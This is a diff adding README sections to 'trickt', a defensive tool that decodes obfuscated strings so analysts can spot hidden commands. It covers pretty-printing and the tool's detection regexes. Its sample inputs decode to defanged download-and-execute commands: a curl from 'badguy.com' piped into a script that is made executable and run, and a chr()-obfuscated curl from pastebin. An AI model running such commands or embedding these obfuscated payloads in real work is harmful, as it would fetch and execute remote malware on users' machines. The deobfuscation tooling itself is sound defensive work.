@@ -144,6 +144,66 @@ line 9::original:>  b"oops, forgot my script here:  readpipe(chr(99) . chr(117) 
     |--decoded_code_point>  b'curl hxxps://pastebin.com/raw/code_points > bad_file.sh && ./bad_file.sh'
 ```
 
+### Pretty print
+
+If you don't like looking at escaped new-line and tab characters, you can pretty print with the `-p` or `--pretty` switches.
+
+Without `--pretty`:
+```bash
+$ trickt 'WwoJewoJCSJrZXkiOiAidmFsdWUgd2l0aCBubyB0cmlja2luZXNzIiwKCQkibmFpdmUtY29tbWFuZHMiOiBbCgkJCSJPeUJqZFhKc0lHaDRlSEJiT2wwdkwySmhaR2QxZVM1amIyMHZiV0ZzZWlBK0lISjFibTFsTG5Ob0lDWW1JR05vYlc5a0lDdDRJSEoxYm0xbExuTm9JQ1ltSUM0dmNuVnViV1V1YzJnN0NnPT0iLAoJCQkibHMgLWFsaCIKCQldLAoJCSJkdXJhdGlvbiI6IDM2MDAsCgkJImRpY3QiOiB7CgkJCSJpbm5lci1rZXkiOiAiaW5uZXItdmFsdWUiCgkJfQoJfQpdCg=='
+
+Searching string for trickiness...
+
+line 1::original:>  b'WwoJewoJCSJrZXkiOiAidmFsdWUgd2l0aCBubyB0cmlja2luZXNzIiwKCQkibmFpdmUtY29tbWFuZHMiOiBbCgkJCSJPeUJqZFhKc0lHaDRlSEJiT2wwdkwySmhaR2QxZVM1amIyMHZiV0ZzZWlBK0lISjFibTFsTG5Ob0lDWW1JR05vYlc5a0lDdDRJSEoxYm0xbExuTm9JQ1ltSUM0dmNuVnViV1V1YzJnN0NnPT0iLAoJCQkibHMgLWFsaCIKCQldLAoJCSJkdXJhdGlvbiI6IDM2MDAsCgkJImRpY3QiOiB7CgkJCSJpbm5lci1rZXkiOiAiaW5uZXItdmFsdWUiCgkJfQoJfQpdCg=='
+    |
+    |--decoded_base64>  b'[\n\t{\n\t\t"key": "value with no trickiness",\n\t\t"naive-commands": [\n\t\t\t"OyBjdXJsIGh4eHBbOl0vL2JhZGd1eS5jb20vbWFseiA+IHJ1bm1lLnNoICYmIGNobW9kICt4IHJ1bm1lLnNoICYmIC4vcnVubWUuc2g7Cg==",\n\t\t\t"ls -alh"\n\t\t],\n\t\t"duration": 3600,\n\t\t"dict": {\n\t\t\t"inner-key": "inner-value"\n\t\t}\n\t}\n]'
+        |
+        |--decoded_base64>  b'; curl hxxp[:]//badguy.com/malz > runme.sh && chmod +x runme.sh && ./runme.sh;'
+```
+
+With `--pretty`:
+```bash
+$ trickt --pretty 'WwoJewoJCSJrZXkiOiAidmFsdWUgd2l0aCBubyB0cmlja2luZXNzIiwKCQkibmFpdmUtY29tbWFuZHMiOiBbCgkJCSJPeUJqZFhKc0lHaDRlSEJiT2wwdkwySmhaR2QxZVM1amIyMHZiV0ZzZWlBK0lISjFibTFsTG5Ob0lDWW1JR05vYlc5a0lDdDRJSEoxYm0xbExuTm9JQ1ltSUM0dmNuVnViV1V1YzJnN0NnPT0iLAoJCQkibHMgLWFsaCIKCQldLAoJCSJkdXJhdGlvbiI6IDM2MDAsCgkJImRpY3QiOiB7CgkJCSJpbm5lci1rZXkiOiAiaW5uZXItdmFsdWUiCgkJfQoJfQpdCg=='
+
+Searching string for trickiness...
+
+line 1::original:>  WwoJewoJCSJrZXkiOiAidmFsdWUgd2l0aCBubyB0cmlja2luZXNzIiwKCQkibmFpdmUtY29tbWFuZHMiOiBbCgkJCSJPeUJqZFhKc0lHaDRlSEJiT2wwdkwySmhaR2QxZVM1amIyMHZiV0ZzZWlBK0lISjFibTFsTG5Ob0lDWW1JR05vYlc5a0lDdDRJSEoxYm0xbExuTm9JQ1ltSUM0dmNuVnViV1V1YzJnN0NnPT0iLAoJCQkibHMgLWFsaCIKCQldLAoJCSJkdXJhdGlvbiI6IDM2MDAsCgkJImRpY3QiOiB7CgkJCSJpbm5lci1rZXkiOiAiaW5uZXItdmFsdWUiCgkJfQoJfQpdCg==
+    |
+    |--decoded_base64>  [
+        {
+                "key": "value with no trickiness",
+                "naive-commands": [
+                        "OyBjdXJsIGh4eHBbOl0vL2JhZGd1eS5jb20vbWFseiA+IHJ1bm1lLnNoICYmIGNobW9kICt4IHJ1bm1lLnNoICYmIC4vcnVubWUuc2g7Cg==",
+                        "ls -alh"
+                ],
+                "duration": 3600,
+                "dict": {
+                        "inner-key": "inner-value"
+                }
+        }
+]
+        |
+        |--decoded_base64>  ; curl hxxp[:]//badguy.com/malz > runme.sh && chmod +x runme.sh && ./runme.sh;
+```
+
+If you find that `trickt` errors out when running with the `--pretty` switch, then you can try changing the
+encoding type with the `-e` or `--encoding` switch. The default is `utf-8`. The byte string is decoded with the
+value from this switch before being printed to the screen.
+
+### Expectations when using `trickt`
+
+Trickt is not mean to be exhaustive in its capabilities. It is meant to give analysts a quick look at a file or string
+to identify common obfuscation or trickiness. For example, here are the regular expressions used to identify strings
+which `trickt` should analyze further for trickiness:
+
+```python
+REGEX_CHR_STRING = br"(chr\(.+chr\([0-9]+\))"  # Pulls out all chr() strings within a single line.
+REGEX_ESCAPED_CHARACTERS_STRING = br"(\\[xu].+\\[xu][0-9a-fA-F]+)"
+_REGEX_B64_STRING = br"([0-9a-zA-Z\+\\]{32,}[=]{0,2})"
+REGEX_URL_ENCODED = br"^.*%[0-9a-fA-F]{2}.*$"
+```
+As you can see... not exhaustive nor much finesse.
+
 ## Use the API
 
 You can use the individual functions by importing `trickt`.
